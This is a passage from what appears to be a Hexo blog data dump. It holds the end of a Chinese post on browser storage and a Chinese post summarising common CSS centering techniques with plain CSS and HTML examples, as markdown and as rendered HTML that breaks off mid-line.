support local storage&apos;);\n      }\n}\n</code></pre><h2 id=\"三、客户端数据库\"><a href=\"#三、客户端数据库\" class=\"headerlink\" title=\"三、客户端数据库\"></a>三、客户端数据库</h2><p>cookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。</p>\n<p><strong>包括</strong> ：Web SQL Database  / IndexedDB</p>\n<p><strong>访问</strong> ：同域名下可以访问。</p>\n<p><strong>存储时间</strong> ：永久存储，除非用户手动清除数据。</p>\n<p><strong>大小限制</strong> ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。</p>\n<h3 id=\"Web-SQL-Database\"><a href=\"#Web-SQL-Database\" class=\"headerlink\" title=\"Web SQL Database\"></a>Web SQL Database</h3><ol>\n<li>可以处理复杂的关系型数据，并且使用SQL语句进行操作</li>\n<li><p>因为过于依赖后端SQL语言的语法，<strong>已被Web应用工作组废弃</strong> ，但在手机端浏览器中的的支持率仍然较高</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png\" alt=\"图5_Web SQL Database浏览器支持情况\"></p>\n</li>\n</ol>\n<p><strong>三个核心方法：</strong><br>openDatabase：创建数据库对象<br>transaction：用于根据情况控制事务提交或回滚<br>executeSql：用于执行SQL 查询</p>\n<h3 id=\"IndexedDB\"><a href=\"#IndexedDB\" class=\"headerlink\" title=\"IndexedDB\"></a>IndexedDB</h3><ol>\n<li>IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据</li>\n<li>大部分浏览器都已支持或支持部分功能</li>\n</ol>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png\" alt=\"图6_indexedDB浏览器支持情况\"></p>"},{"title":"总结向↗CSS居中常用套路","date":"2016-09-08T13:00:00.000Z","toc":true,"comments":1,"_content":"> by MaryTien from [http://luckymona.github.io](http://luckymona.github.io)\n> 本文地址：[http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css](http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css)\n\n之前差不多有小半年时间做切图仔，虽然居中的方法来来去去常用的就那么几个，但是由于没有认真总结过每种方案适用的场景，有时遇到居中需求还是不能一下就用对方法，试来试去浪费时间。本文就对CSS中的常用的居中方案来个总结，本想来个最强总结，但是CSS套路太多，写着写着就不想写了==!，于是变成了常用方案的总结。（文中例子均为以chrome测试结果）\n<!-- More -->\n\n# 常用元素分类--按照块元素、行内元素 #\n居中的需求常常涉及这些因素：内联元素居中、块元素居中，块元素居中又分为定宽度、不定宽度，还有各种定位、浮动、父元素宽高，等等。于是我先把常用元素按照display值分一下类。根据二八原则，仅举常用的比较重要的小朋友，且不包括HTML5那些新标签（多了人家记不住嘛，脑细胞要想更重要的事 ~~嗯，一个借口~~）\n\n## 常用block元素： ##\n文档类：head \\ html \\ body \n文章类：h \\ h1~h6 \\ p \n布局类：div \\ br \\ hr\n列表类：ol \\ ul \\ li \\ dl \\ dt \\ dd\n表单类：form\n需注意的：**hr是块元素，可以设定宽高**\n\n## 常用inline元素： ##\na \\ span \\ strong \\ i \\ em \\ del \\ q \n\n## 常用的inline-block元素： ##\nimg \\ input \\ button \\ select \\ textarea\n\n## 其他元素： ##\n\n1. 与select搭配使用的option、optgroup，虽然是display:block的元素，但是却不能设定宽高\n2. 起配置作用的元素：meta、script、style\n3. table元素：（markdown中写表格很费劲，推荐一个插件TableEditor）\n\n| table元素名   | display值         | \n| :-----------: | :---------------: |\n| table         |   table           |\n| thead         | table-header-group| \n| tbody         | table-row-group   | \n| tfoot         | table-footer-group| \n| tr            | table-row         |   \n| th / td       | table-cell        | \n\ninline元素不存在宽高，也就不存在居不居中的问题。所以讨论居中主要是讨论block / inline-block元素的居中。\n\n# 居中主要用到的技术 #\n## line-height--垂直居中 ##\nblock / inline-block元素，通过使height值等于line-height值，使 **单行文本内容** 或者 **单行display:inline的元素**垂直居中:\n```\n.block_center { height:200px; line-height:200px; border:1px solid red; }\n.inlineB_center { display:inline-block; height:200px; line-height:200px; border:1px solid red; }\n\n<p class=\"block_Center\">dfasdfadfa</p>\n<p class=\"inlineB_center\">dfasdfadfa</p>\n\n.origin_inlineB_center { height:200px; line-height:200px; border:1px solid red; }\n<input class=\"origin_inlineB_center\" type=\"text\" value=\"aaaaa\">\n<button class=\"origin_inlineB_center\" >aaaaa</button>\n<textarea sclass=\"origin_inlineB_center\" >aaaaa</textarea>\n```\n\n**需注意:**\n\n1. 子元素为inline-block元素，父级加line-height等于height，并不能使子元素居中：\n```\n.father { height: 200px; width:100px; line-height: 200px; border:1px solid red; }\n.child { height: 100px; width:100px; background: red; display: inline-block; }\n<div class=\"father\">\n        <div class=\"child\"></div>\n</div>\n\n<!-- 或者原生inline-block元素也不行,class内容同上，.child 去掉display:inline-block -->\n\n<div class=\"father\">\n    <input class=\"child\" type=\"button\" name=\"\">\n</div>\n\n<!-- or -->\n<div class=\"father\">\n    <img src=\"1.jpg\" class=\"child\">\n</div>\n```\n都是这样的结果：\n![align/1](http://o798x2hdw.bkt.clouddn.com/align/1.png) ![align/2](http://o798x2hdw.bkt.clouddn.com/align/2.png)\n\n## text-align:center--水平居中 ##\ntext-align顾名思义，其主要作用是对齐text的，具体说来：\n\n1. 是使block / inline-block元素的内容文本水平居中，但对inline-block元素select无效\n```\n<!-- div元素 -->\n.center { text-align:center }\n<div class=\"center\">This text will be in the center</div>\n<p class=\"center\">dsfadfadfafgdfs</p>\n\n<!-- inline-block元素 -->\n.inlineB_center { text-align:center; width:100px; }\n<input class=\"inlineB_center\" value=\"aaaaa\" type=\"text\">\n<button class=\"inlineB_center\">aaaaa</button>\n<textarea class=\"inlineB_center\">aaaaa</textarea>\n```\n2. 此外，还可以使作为子元素的inline / inline-block元素在父元素内水平居中\n```\n.center { text-align:center; width: 200px; height:100px; border:1px solid red; }\n.centerChild { width:100px; height:100px; }\n\n<div class=\"center\">\n    <div style=\"display:inline\">aaa</div>\n</div>\n\n<div class=\"center\">\n    <div style=\"display:inline-block\">aaa</div>\n</div>\n\n<!-- or 原生inline-block元素 -->\n<div class=\"center\">\n    <img src=\"1.jpg\" class=\"centerChild\">\n</div>\n```\n\n## padding--水平垂直居中 ##\n通过在内容的上下左右添加同样的距离，来反向达到内容居中的效果。通过这种方法实现居中，限制条件比较多。这种居中相当于在模拟标准盒模型，父级相当于border，子级相当于content，二者的宽高通过padding相互制约。所以一般不使用padding来做居中，它经常的使用场景是，在一块内容分区的边线内的四面留白。如下图红线框起来的内容区和外边框之间的留白\n![align/3](http://o798x2hdw.bkt.clouddn.com/align/3.png)\n\n## margin 0 auto--水平居中 ##\n最常使用的是margin:xx auto，可以令子级水平居中，但是在上下margin上设定auto却不能令其垂直居中，这是由CSS2规范的规定决定的^1。\n\n原理是，CSS2规范规定：\n>块级元素在普通流内布局按以下公式：左m+左b+左p+w+右p+右b+右m = 包含块宽度\n>如果宽度w不是auto，并且左margin和右margin都是auto的话，两者相等。\n\n然而纵向margin没有规定，于是就不能垂直居中。\n\n**限制条件是：**\n\n1. 父级子级均为block元素\n2. 父级子级宽度固定\n3. 并且处于正常文档流中\n\n**失效情况：**\n\n1. 如果子级是inline元素或者inline-block元素，居中会失效；\n2. 如果没有设定父级宽度，居中会失效；\n3. 如果子级宽度为auto那就整行撑满父级，宽度等于父级了，也就没有什么居中不居中了；\n4. 子级设定了绝对定位或者固定定位，脱离了正常文档流，居中会失效；\n5. 另外如果不写DOCTYPE或者写的不正确也会导致失效。\n\n## absolute + left/top 50% + margin为宽/高一半的负值--水平垂直居中 ##\n**限制条件：**\n\n1. 父级定位relative，子级定位absolute,\n2. 子级宽度确定\n```\n.father { border:2px solid #f77; height:100px; width:300px; position:relative; }\n.child { width:100px; height:100px; background:#7c7; position:absolute; left:50%;  margin-left:-50px;}\n\n<div class=\"father\">\n    <div class=\"child\"></div>\n</div>\n```\n![align/4](http://o798x2hdw.bkt.clouddn.com/align/4.png)\n\nmargin负值的重要作用有^2：\n\n1. 相对自身偏移，达到的视觉效果相当于`position：relative; top：-xx; left:-xx; right:-xx; bottom:-xx`，但与之的区别在于，relative偏移后仍占据原来的位置，margin负值的偏移连原来占据的位置也会偏移，常利用这点，设置左上的margin负值，遮盖左边或者上边的border，如果设置右下的，则会被后面的内容遮住。\n\n2. 扩展宽度例如\n\n```\ndiv { width:432px; background:#999; }\nul { margin-right: -10px; height:200px; border:1px solid #f77; padding:0;}\nli { width:100px; margin-right:10px; float:left; height:100px; background:#7c7; list-style: none;}\n\n<div>\n    <ul>\n        <li></li>\n        <li></li>\n        <li></li>\n        <li></li>\n    </ul>\n</div>\n```\n![align/5](http://o798x2hdw.bkt.clouddn.com/align/5.png)\n\n## absolute + left/top 50% + transform translate--水平垂直居中 ##\n上面的居中方法有一个限制是必须知道子级的宽高，CSS3中的transform的translate可以基于自身尺寸设定百分数，这样就不用知道子级的宽高，也能做到居中了。此方法从张鑫旭大神博客学来^3，感谢大神。\n缺点： IE9(-ms-), IE10+以及其他现代浏览器才支持\n```\n    .father { position:relative; \n              width:300px; height: 300px; border:1px solid red;\n            }\n    .child { position:absolute; \n             left:50%; \n             top:50%;\n             transform: translate(-50%, -50%);\n\n             width:100px; height: 100px; background: #7c7;\n            }\n    <div class=\"father\">\n        <div class=\"child\"></div>\n    </div>\n```\n![align/6](http://o798x2hdw.bkt.clouddn.com/align/6.png)\n\n## margin：auto + absolute 0 0 0 0--水平垂直居中 ##\n比起上面的方法，可以兼容IE8+浏览器，同样来自张鑫旭大神^3，出来效果同上\n\n```\n    .father { position:relative; \n              width:300px; height: 300px; border:1px solid red;\n            }\n    .child { position:absolute; \n             left:0;\n             top:0; \n             right: 0; \n             bottom: 0;\n\n             margin:auto;\n\n             width:100px; height: 100px; background: #7c7; \n            }\n\n    <div class=\"father\">\n        <div class=\"child\"></div>\n    </div>\n```\n\n简单翻译下原理 ^4：\n\n1. 正常文档流内，对于top和bottom，margin为auto，等同于margin等于零；\n2. absolute使之脱离正常文档流，此时的margin auto相当于不起作用了；\n3. 设定四面都为0后，浏览器会在设定了relative的父元素内，贴近父元素的border设置一个边界盒子（bound box），此时，边界盒子占满父元素所有空间；\n4. 给子元素设定了宽或者高，就阻止其占满父元素所有空间，迫使浏览器基于边界盒子重新计算margin：auto；\n5. 现在元素是绝对定位，非正常文档流，浏览器计算margin：auto时，就让上下margin相等（基于规范规定），这样元素就居中于边界盒子（bound box），也就居中于父元素了。\n\n## table-cell + vertical-align --水平居中##\n如果是在td元素中，可以直接使用属性valign=\"middle\"做垂直居中，align=\"center\"做水平居中\n```\ntd { width:300px; height: 300px; border:1px solid red; }\n.tdChild { width:100px; height: 100px; background: #7c7; }\n\n<td valign=\"middle\" align=\"center\">\n    <div class=\"tdChild\"></div>\n</td>\n\n```\n\n如果没有table，没有td元素，可以用css这样写：\n这种方法，子级不需要大小固定，可以用于：多行文字居中、大小不固定图片的居中\n有一个疑问，许多博客写这种方法的时候，都要给.father再加一个父级，让这个父级display:table,我不知道为什么要这么加，因为不加的时候就可以居中。\n```\n    .father {\n        display: table-cell;\n        vertical-align: middle;\n         \n        width:300px; \n        height: 300px; \n        border:1px solid red;\n    }\n    .child { display: inline-block; background: #7c7; }\n\n    <div class=\"father\">\n        <div class=\"child\">dafsdf sda sdf sdfas sdf<br>dsfasd sdf dd </div>\n    </div>\n```\n\n## css3 flex居中--水平垂直居中 ##\n兼容性不太好，适用于手机端开发，水平垂直居中：\n```\n    .father { display:-webkit-box;\n        -webkit-box-align:center;\n        -webkit-box-pack:center;\n        \n        width:300px; \n        height: 300px; \n        border:1px solid red; \n    } \n    .child { display:-webkit-flex; \n\n        width: 100px; \n        height:100px; \n        background: #7c7; \n        margin-bottom:10px;\n    }\n    <div class=\"father\">\n        <div class=\"child\"></div>\n    </div>\n```\n![align/7](http://o798x2hdw.bkt.clouddn.com/align/7.png)\n\n本人常用的就是这些居中方法了，还有一些居中方式，本人比较不常用，由于精力有限就不加了。另外小可才疏学浅，时间仓促，如有错漏处，请大力批评！另外的另外，写博客真累，但是也真的很有成就感呀，赫赫~~\n\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css](http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css)\n\n参考链接：\n\n^1:[为什么「margin:auto」可以让块级元素水平居中？](https://www.zhihu.com/question/21644198)\n^2:[CSS布局奇淫巧计之-强大的负边距](http://www.cnblogs.com/2050/archive/2012/08/13/2636467.html)\n^3:[小tip: margin:auto实现绝对定位元素的水平垂直居中](http://www.zhangxinxu.com/wordpress/2013/11/margin-auto-absolute-%E7%BB%9D%E5%AF%B9%E5%AE%9A%E4%BD%8D-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/)\n^4:[Absolute Horizontal And Vertical Centering In CSS](https://www.smashingmagazine.com/2013/08/absolute-horizontal-vertical-centering-css)\n\n","source":"_posts/summary-of-aligning-to-center-solutions-in-css.md","raw":"---\ntitle: 总结向↗CSS居中常用套路\ndate: 2016-09-08 21:00:00\ncategories: CSS\ntags: [CSS, 垂直居中, 水平居中, 方案总结, 总结] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n> by MaryTien from [http://luckymona.github.io](http://luckymona.github.io)\n> 本文地址：[http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css](http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css)\n\n之前差不多有小半年时间做切图仔，虽然居中的方法来来去去常用的就那么几个，但是由于没有认真总结过每种方案适用的场景，有时遇到居中需求还是不能一下就用对方法，试来试去浪费时间。本文就对CSS中的常用的居中方案来个总结，本想来个最强总结，但是CSS套路太多，写着写着就不想写了==!，于是变成了常用方案的总结。（文中例子均为以chrome测试结果）\n<!-- More -->\n\n# 常用元素分类--按照块元素、行内元素 #\n居中的需求常常涉及这些因素：内联元素居中、块元素居中，块元素居中又分为定宽度、不定宽度，还有各种定位、浮动、父元素宽高，等等。于是我先把常用元素按照display值分一下类。根据二八原则，仅举常用的比较重要的小朋友，且不包括HTML5那些新标签（多了人家记不住嘛，脑细胞要想更重要的事 ~~嗯，一个借口~~）\n\n## 常用block元素： ##\n文档类：head \\ html \\ body \n文章类：h \\ h1~h6 \\ p \n布局类：div \\ br \\ hr\n列表类：ol \\ ul \\ li \\ dl \\ dt \\ dd\n表单类：form\n需注意的：**hr是块元素，可以设定宽高**\n\n## 常用inline元素： ##\na \\ span \\ strong \\ i \\ em \\ del \\ q \n\n## 常用的inline-block元素： ##\nimg \\ input \\ button \\ select \\ textarea\n\n## 其他元素： ##\n\n1. 与select搭配使用的option、optgroup，虽然是display:block的元素，但是却不能设定宽高\n2. 起配置作用的元素：meta、script、style\n3. table元素：（markdown中写表格很费劲，推荐一个插件TableEditor）\n\n| table元素名   | display值         | \n| :-----------: | :---------------: |\n| table         |   table           |\n| thead         | table-header-group| \n| tbody         | table-row-group   | \n| tfoot         | table-footer-group| \n| tr            | table-row         |   \n| th / td       | table-cell        | \n\ninline元素不存在宽高，也就不存在居不居中的问题。所以讨论居中主要是讨论block / inline-block元素的居中。\n\n# 居中主要用到的技术 #\n## line-height--垂直居中 ##\nblock / inline-block元素，通过使height值等于line-height值，使 **单行文本内容** 或者 **单行display:inline的元素**垂直居中:\n```\n.block_center { height:200px; line-height:200px; border:1px solid red; }\n.inlineB_center { display:inline-block; height:200px; line-height:200px; border:1px solid red; }\n\n<p class=\"block_Center\">dfasdfadfa</p>\n<p class=\"inlineB_center\">dfasdfadfa</p>\n\n.origin_inlineB_center { height:200px; line-height:200px; border:1px solid red; }\n<input class=\"origin_inlineB_center\" type=\"text\" value=\"aaaaa\">\n<button class=\"origin_inlineB_center\" >aaaaa</button>\n<textarea sclass=\"origin_inlineB_center\" >aaaaa</textarea>\n```\n\n**需注意:**\n\n1. 子元素为inline-block元素，父级加line-height等于height，并不能使子元素居中：\n```\n.father { height: 200px; width:100px; line-height: 200px; border:1px solid red; }\n.child { height: 100px; width:100px; background: red; display: inline-block; }\n<div class=\"father\">\n        <div class=\"child\"></div>\n</div>\n\n<!-- 或者原生inline-block元素也不行,class内容同上，.child 去掉display:inline-block -->\n\n<div class=\"father\">\n    <input class=\"child\" type=\"button\" name=\"\">\n</div>\n\n<!-- or -->\n<div class=\"father\">\n    <img src=\"1.jpg\" class=\"child\">\n</div>\n```\n都是这样的结果：\n![align/1](http://o798x2hdw.bkt.clouddn.com/align/1.png) ![align/2](http://o798x2hdw.bkt.clouddn.com/align/2.png)\n\n## text-align:center--水平居中 ##\ntext-align顾名思义，其主要作用是对齐text的，具体说来：\n\n1. 是使block / inline-block元素的内容文本水平居中，但对inline-block元素select无效\n```\n<!-- div元素 -->\n.center { text-align:center }\n<div class=\"center\">This text will be in the center</div>\n<p class=\"center\">dsfadfadfafgdfs</p>\n\n<!-- inline-block元素 -->\n.inlineB_center { text-align:center; width:100px; }\n<input class=\"inlineB_center\" value=\"aaaaa\" type=\"text\">\n<button class=\"inlineB_center\">aaaaa</button>\n<textarea class=\"inlineB_center\">aaaaa</textarea>\n```\n2. 此外，还可以使作为子元素的inline / inline-block元素在父元素内水平居中\n```\n.center { text-align:center; width: 200px; height:100px; border:1px solid red; }\n.centerChild { width:100px; height:100px; }\n\n<div class=\"center\">\n    <div style=\"display:inline\">aaa</div>\n</div>\n\n<div class=\"center\">\n    <div style=\"display:inline-block\">aaa</div>\n</div>\n\n<!-- or 原生inline-block元素 -->\n<div class=\"center\">\n    <img src=\"1.jpg\" class=\"centerChild\">\n</div>\n```\n\n## padding--水平垂直居中 ##\n通过在内容的上下左右添加同样的距离，来反向达到内容居中的效果。通过这种方法实现居中，限制条件比较多。这种居中相当于在模拟标准盒模型，父级相当于border，子级相当于content，二者的宽高通过padding相互制约。所以一般不使用padding来做居中，它经常的使用场景是，在一块内容分区的边线内的四面留白。如下图红线框起来的内容区和外边框之间的留白\n![align/3](http://o798x2hdw.bkt.clouddn.com/align/3.png)\n\n## margin 0 auto--水平居中 ##\n最常使用的是margin:xx auto，可以令子级水平居中，但是在上下margin上设定auto却不能令其垂直居中，这是由CSS2规范的规定决定的^1。\n\n原理是，CSS2规范规定：\n>块级元素在普通流内布局按以下公式：左m+左b+左p+w+右p+右b+右m = 包含块宽度\n>如果宽度w不是auto，并且左margin和右margin都是auto的话，两者相等。\n\n然而纵向margin没有规定，于是就不能垂直居中。\n\n**限制条件是：**\n\n1. 父级子级均为block元素\n2. 父级子级宽度固定\n3. 并且处于正常文档流中\n\n**失效情况：**\n\n1. 如果子级是inline元素或者inline-block元素，居中会失效；\n2. 如果没有设定父级宽度，居中会失效；\n3. 如果子级宽度为auto那就整行撑满父级，宽度等于父级了，也就没有什么居中不居中了；\n4. 子级设定了绝对定位或者固定定位，脱离了正常文档流，居中会失效；\n5. 另外如果不写DOCTYPE或者写的不正确也会导致失效。\n\n## absolute + left/top 50% + margin为宽/高一半的负值--水平垂直居中 ##\n**限制条件：**\n\n1. 父级定位relative，子级定位absolute,\n2. 子级宽度确定\n```\n.father { border:2px solid #f77; height:100px; width:300px; position:relative; }\n.child { width:100px; height:100px; background:#7c7; position:absolute; left:50%;  margin-left:-50px;}\n\n<div class=\"father\">\n    <div class=\"child\"></div>\n</div>\n```\n![align/4](http://o798x2hdw.bkt.clouddn.com/align/4.png)\n\nmargin负值的重要作用有^2：\n\n1. 相对自身偏移，达到的视觉效果相当于`position：relative; top：-xx; left:-xx; right:-xx; bottom:-xx`，但与之的区别在于，relative偏移后仍占据原来的位置，margin负值的偏移连原来占据的位置也会偏移，常利用这点，设置左上的margin负值，遮盖左边或者上边的border，如果设置右下的，则会被后面的内容遮住。\n\n2. 扩展宽度例如\n\n```\ndiv { width:432px; background:#999; }\nul { margin-right: -10px; height:200px; border:1px solid #f77; padding:0;}\nli { width:100px; margin-right:10px; float:left; height:100px; background:#7c7; list-style: none;}\n\n<div>\n    <ul>\n        <li></li>\n        <li></li>\n        <li></li>\n        <li></li>\n    </ul>\n</div>\n```\n![align/5](http://o798x2hdw.bkt.clouddn.com/align/5.png)\n\n## absolute + left/top 50% + transform translate--水平垂直居中 ##\n上面的居中方法有一个限制是必须知道子级的宽高，CSS3中的transform的translate可以基于自身尺寸设定百分数，这样就不用知道子级的宽高，也能做到居中了。此方法从张鑫旭大神博客学来^3，感谢大神。\n缺点： IE9(-ms-), IE10+以及其他现代浏览器才支持\n```\n    .father { position:relative; \n              width:300px; height: 300px; border:1px solid red;\n            }\n    .child { position:absolute; \n             left:50%; \n             top:50%;\n             transform: translate(-50%, -50%);\n\n             width:100px; height: 100px; background: #7c7;\n            }\n    <div class=\"father\">\n        <div class=\"child\"></div>\n    </div>\n```\n![align/6](http://o798x2hdw.bkt.clouddn.com/align/6.png)\n\n## margin：auto + absolute 0 0 0 0--水平垂直居中 ##\n比起上面的方法，可以兼容IE8+浏览器，同样来自张鑫旭大神^3，出来效果同上\n\n```\n    .father { position:relative; \n              width:300px; height: 300px; border:1px solid red;\n            }\n    .child { position:absolute; \n             left:0;\n             top:0; \n             right: 0; \n             bottom: 0;\n\n             margin:auto;\n\n             width:100px; height: 100px; background: #7c7; \n            }\n\n    <div class=\"father\">\n        <div class=\"child\"></div>\n    </div>\n```\n\n简单翻译下原理 ^4：\n\n1. 正常文档流内，对于top和bottom，margin为auto，等同于margin等于零；\n2. absolute使之脱离正常文档流，此时的margin auto相当于不起作用了；\n3. 设定四面都为0后，浏览器会在设定了relative的父元素内，贴近父元素的border设置一个边界盒子（bound box），此时，边界盒子占满父元素所有空间；\n4. 给子元素设定了宽或者高，就阻止其占满父元素所有空间，迫使浏览器基于边界盒子重新计算margin：auto；\n5. 现在元素是绝对定位，非正常文档流，浏览器计算margin：auto时，就让上下margin相等（基于规范规定），这样元素就居中于边界盒子（bound box），也就居中于父元素了。\n\n## table-cell + vertical-align --水平居中##\n如果是在td元素中，可以直接使用属性valign=\"middle\"做垂直居中，align=\"center\"做水平居中\n```\ntd { width:300px; height: 300px; border:1px solid red; }\n.tdChild { width:100px; height: 100px; background: #7c7; }\n\n<td valign=\"middle\" align=\"center\">\n    <div class=\"tdChild\"></div>\n</td>\n\n```\n\n如果没有table，没有td元素，可以用css这样写：\n这种方法，子级不需要大小固定，可以用于：多行文字居中、大小不固定图片的居中\n有一个疑问，许多博客写这种方法的时候，都要给.father再加一个父级，让这个父级display:table,我不知道为什么要这么加，因为不加的时候就可以居中。\n```\n    .father {\n        display: table-cell;\n        vertical-align: middle;\n         \n        width:300px; \n        height: 300px; \n        border:1px solid red;\n    }\n    .child { display: inline-block; background: #7c7; }\n\n    <div class=\"father\">\n        <div class=\"child\">dafsdf sda sdf sdfas sdf<br>dsfasd sdf dd </div>\n    </div>\n```\n\n## css3 flex居中--水平垂直居中 ##\n兼容性不太好，适用于手机端开发，水平垂直居中：\n```\n    .father { display:-webkit-box;\n        -webkit-box-align:center;\n        -webkit-box-pack:center;\n        \n        width:300px; \n        height: 300px; \n        border:1px solid red; \n    } \n    .child { display:-webkit-flex; \n\n        width: 100px; \n        height:100px; \n        background: #7c7; \n        margin-bottom:10px;\n    }\n    <div class=\"father\">\n        <div class=\"child\"></div>\n    </div>\n```\n![align/7](http://o798x2hdw.bkt.clouddn.com/align/7.png)\n\n本人常用的就是这些居中方法了，还有一些居中方式，本人比较不常用，由于精力有限就不加了。另外小可才疏学浅，时间仓促，如有错漏处，请大力批评！另外的另外，写博客真累，但是也真的很有成就感呀，赫赫~~\n\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css](http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css)\n\n参考链接：\n\n^1:[为什么「margin:auto」可以让块级元素水平居中？](https://www.zhihu.com/question/21644198)\n^2:[CSS布局奇淫巧计之-强大的负边距](http://www.cnblogs.com/2050/archive/2012/08/13/2636467.html)\n^3:[小tip: margin:auto实现绝对定位元素的水平垂直居中](http://www.zhangxinxu.com/wordpress/2013/11/margin-auto-absolute-%E7%BB%9D%E5%AF%B9%E5%AE%9A%E4%BD%8D-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/)\n^4:[Absolute Horizontal And Vertical Centering In CSS](https://www.smashingmagazine.com/2013/08/absolute-horizontal-vertical-centering-css)\n\n","slug":"summary-of-aligning-to-center-solutions-in-css","published":1,"updated":"2018-05-07T10:29:59.604Z","layout":"post","photos":[],"link":"","_id":"cjgw444ag002e8d95b11d6g2n","content":"<blockquote>\n<p>by MaryTien from <a href=\"http://luckymona.github.io\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css</a></p>\n</blockquote>\n<p>之前差不多有小半年时间做切图仔，虽然居中的方法来来去去常用的就那么几个，但是由于没有认真总结过每种方案适用的场景，有时遇到居中需求还是不能一下就用对方法，试来试去浪费时间。本文就对CSS中的常用的居中方案来个总结，本想来个最强总结，但是CSS套路太多，写着写着就不想写了==!，于是变成了常用方案的总结。（文中例子均为以chrome测试结果）<br><a id=\"more\"></a></p>\n<h1 id=\"常用元素分类–按照块元素、行内元素\"><a href=\"#常用元素分类–按照块元素、行内元素\" class=\"headerlink\" title=\"常用元素分类–按照块元素、行内元素\"></a>常用元素分类–按照块元素、行内元素</h1><p>居中的需求常常涉及这些因素：内联元素居中、块元素居中，块元素居中又分为定宽度、不定宽度，还有各种定位、浮动、父元素宽高，等等。于是我先把常用元素按照display值分一下类。根据二八原则，仅举常用的比较重要的小朋友，且不包括HTML5那些新标签（多了人家记不住嘛，脑细胞要想更重要的事 <del>嗯，一个借口</del>）</p>\n<h2 id=\"常用block元素：\"><a href=\"#常用block元素：\" class=\"headerlink\" title=\"常用block元素：\"></a>常用block元素：</h2><p>文档类：head \\ html \\ body<br>文章类：h \\ h1~h6 \\ p<br>布局类：div \\ br \\ hr<br>列表类：ol \\ ul \\ li \\ dl \\ dt \\ dd<br>表单类：form<br>需注意的：<strong>hr是块元素，可以设定宽高</strong></p>\n<h2 id=\"常用inline元素：\"><a href=\"#常用inline元素：\" class=\"headerlink\" title=\"常用inline元素：\"></a>常用inline元素：</h2><p>a \\ span \\ strong \\ i \\ em \\ del \\ q </p>\n<h2 id=\"常用的inline-block元素：\"><a href=\"#常用的inline-block元素：\" class=\"headerlink\" title=\"常用的inline-block元素：\"></a>常用的inline-block元素：</h2><p>img \\ input \\ button \\ select \\ textarea</p>\n<h2 id=\"其他元素：\"><a href=\"#其他元素：\" class=\"headerlink\" title=\"其他元素：\"></a>其他元素：</h2><ol>\n<li>与select搭配使用的option、optgroup，虽然是display:block的元素，但是却不能设定宽高</li>\n<li>起配置作用的元素：meta、script、style</li>\n<li>table元素：（markdown中写表格很费劲，推荐一个插件TableEditor）</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">table元素名</th>\n<th style=\"text-align:center\">display值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">table</td>\n<td style=\"text-align:center\">table</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">thead</td>\n<td style=\"text-align:center\">table-header-group</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">tbody</td>\n<td style=\"text-align:center\">table-row-group</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">tfoot</td>\n<td style=\"text-align:center\">table-footer-group</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">tr</td>\n<td style=\"text-align:center\">table-row</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">th / td</td>\n<td style=\"text-align:center\">table-cell</td>\n</tr>\n</tbody>\n</table>\n<p>inline元素不存在宽高，也就不存在居不居中的问题。所以讨论居中主要是讨论block / inline-block元素的居中。</p>\n<h1 id=\"居中主要用到的技术\"><a href=\"#居中主要用到的技术\" class=\"headerlink\" title=\"居中主要用到的技术\"></a>居中主要用到的技术</h1><h2 id=\"line-height–垂直居中\"><a href=\"#line-height–垂直居中\" class=\"headerlink\" title=\"line-height–垂直居中\"></a>line-height–垂直居中</h2><p>block / inline-block元素，通过使height值等于line-height值，使 <strong>单行文本内容</strong> 或者 <strong>单行display:inline的元素</strong>垂直居中:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.block_center &#123; height:200px; line-height:200px; border:1px solid red; &#125;</span><br><span class=\"line\">.inlineB_center &#123; display:inline-block; height:200px; line-height:200px; border:1px solid red; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p class=&quot;block_Center&quot;&gt;dfasdfadfa&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;inlineB_center&quot;&gt;dfasdfadfa&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">.origin_inlineB_center &#123; height:200px; line-height:200px; border:1px 